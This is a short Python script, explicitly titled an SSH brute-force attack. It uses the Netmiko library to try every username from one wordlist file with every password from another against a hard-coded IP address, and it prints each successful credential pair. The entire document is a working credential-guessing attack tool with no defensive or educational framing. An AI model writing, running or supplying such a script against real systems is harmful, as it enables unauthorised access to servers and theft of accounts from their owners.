#!/usr/bin/python

from netmiko import Netmiko


wordlist = "word.txt"
userlist = 'user.txt'
ip = '11.11.11.171'
verbose = "yes"

print("[+] - SSH Burteforce Attack")
print("[+] - Target:", ip)



def func_sshbrute(_user, _pass):
    try:
        sshconn = Netmiko(ip, username=_user, password=_pass, device_type="linux")
        print("[+] BINGO - Username:", _user, "Password:", _pass)
        sshconn.disconnect()

    except:
         if verbose == "yes":
                print('[-] - FAIL - Username:', _user, 'Password:', _pass)

with open(userlist, 'r') as _userlist:
    for _line in _userlist:
        _user = _line.strip("\n")

        with open(wordlist, 'r') as _wordlist:
            for _line in _wordlist:
                _word = _line.strip("\n")

                func_sshbrute(_user, _word)
